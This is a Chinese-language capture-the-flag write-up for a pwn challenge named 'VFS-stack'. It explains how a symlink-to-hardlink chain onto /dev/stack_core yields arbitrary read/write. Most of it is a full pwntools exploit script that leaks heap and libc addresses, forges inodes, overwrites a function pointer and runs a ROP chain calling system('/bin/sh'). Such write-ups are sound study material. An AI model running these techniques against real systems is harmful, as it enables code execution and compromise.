# VFS-stack

## 题目简述

虚拟文件系统 Pwn 题。利用软链接到硬链接再到 `/dev/stack_core` 的对象关系，在系统内获得任意地址读写能力，随后泄露堆/栈结构并布置 ROP。

## 解题过程

软链接->硬链接->stackcore即可实现在系统内aaw

```python
from pwn import *
#io=process('./pwn')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
#io=remote("challenge.host", PORT)
io=process('./pwn',stdin=PTY, stdout=PTY)
context.log_level='debug'
def bug():
    gdb.attach(io)
def hard(src,dest):
    io.sendline(b"HARDLINK "+src+b" "+dest)
def soft(src,dest):
    io.sendlineafter(b"vfs> ",b"SOFTLINK "+src+b" "+dest)
def show(tar, length):
    io.sendlineafter(b"vfs> ", b"READ " + tar + b" " + str(length).encode())
    io.recvuntil(f"DATA {length}\n".encode())
    data = io.recvn(length)
    return data
def edit(tar,payload):
    io.sendlineafter(b"vfs> ",b"WRITE "+tar+b" "+str(len(payload)).encode())
    io.send(payload)
def edit(tar, payload, wait=True):
    io.sendlineafter(b"vfs> ", b"WRITE " + tar + b" " +
str(len(payload)).encode())
    io.recvuntil(b"READY\n")
    io.send(payload)
def inode(name, in_use, admin, ftype, size, ptr):
    name = name[:15].ljust(16, b"\x00")
    return name + p32(in_use) + p32(admin) + p32(ftype) + p32(size) + p64(ptr)
hard(b"/dev/stack_core",b"/dev/1")
soft(b"/dev/1",b"/dev/2")
#pause()
#edit(b"/dev/2",b'a'*8)
leak = show(b"/dev/2", 0x550)
disk_addr   = u64(leak[0x20:0x28])
inodes_addr = disk_addr + 0x800
wctx_addr   = inodes_addr + 0x140
commit_slot = wctx_addr + 0x408
log.info(f"disk   = {hex(disk_addr)}")
log.info(f"inodes = {hex(inodes_addr)}")
log.info(f"wctx   = {hex(wctx_addr)}")
log.info(f"commit = {hex(commit_slot)}")
meta = bytearray(leak[:0x140])
meta[4*0x28:5*0x28] = inode(b"libc_leak", 1, 0, 0, 8, elf.got.read)
meta[5*0x28:6*0x28] = inode(b"fp_overw", 1, 0, 0, 8, commit_slot)
meta[7*0x28:8*0x28] = inode(b"sc", 1, 0, 0, 0x400, disk_addr)
edit(b"/dev/2", meta)
read_addr = u64(show(b"libc_leak", 8))
base = read_addr - libc.sym.read
print(hex(base))
rdi=base+0x000000000010f78b
edit(b"fp_overw", p64(base + 0x17929D))
wctx = wctx_addr
payload=flat({
     0x18:p64(wctx+0x80+0x20),
     0x48:p64(wctx),
     0x98:b"./flag\x00\x00",
     0xa0:p64(wctx+0x100),
     0xa8:p64(rdi+1),
     0xc8:p64(base+libc.sym.swapcontext+157),
     0xe0:p64(wctx),
     0x100:p64(rdi+1)
},filler=b'\x00')
rsi=base+0x0000000000110a7d
payload+=p64(rdi+1)*8#+p64(0x402480)
open_=base+libc.sym.open
payload+=p64(rdi)+p64(wctx+0x98)+p64(rsi)+p64(0)+p64(open_)
#payload+=p64(rdi)+p64(3)+p64()+p64(wctx)+p64()
rcx=base+0x00000000000a877e
system=base+libc.sym.system
binsh=base+next(libc.search('/bin/sh'))
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rcx)+p64(0x100)+p64(rdi+1)+p64(rdi
)+p64(binsh)+p64(system)
#payload=p64(rdi+1)+p64(rdi)+p64(binsh)+p64(system)
bug()
edit(b"sc", payload)
io.interactive()
```

沙箱没开好,调用system('/bin/sh')即可

## 方法总结

- 核心技巧：VFS 链接语义绕过带来的进程内 AAR/AAW，再转 ROP。
- 识别信号：题目实现自定义 HARDLINK/SOFTLINK/READ/WRITE 且存在特殊设备文件时，应检查链接解析后实际读写对象。
- 复用要点：先构造能稳定泄露内部结构的路径，再用伪造 inode/写上下文把读写原语扩大到控制流。
